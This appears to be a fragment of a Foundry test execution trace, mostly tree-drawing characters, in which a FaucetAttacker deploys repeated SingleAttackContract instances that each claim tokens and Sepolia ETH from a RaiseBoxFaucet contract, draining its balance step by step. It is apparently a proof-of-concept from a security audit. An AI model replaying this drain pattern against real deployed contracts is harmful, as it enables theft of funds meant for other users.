    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1106280] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 585000000000000000 [5.85e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xdfa11316f15027CedD07331680d67875B3E7DE32
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 83) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [848896] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [848137] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [811969] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [804311] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 580000000000000000 [5.8e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x951c8B282061F896c784F216652Afa532932c67f
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 84) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
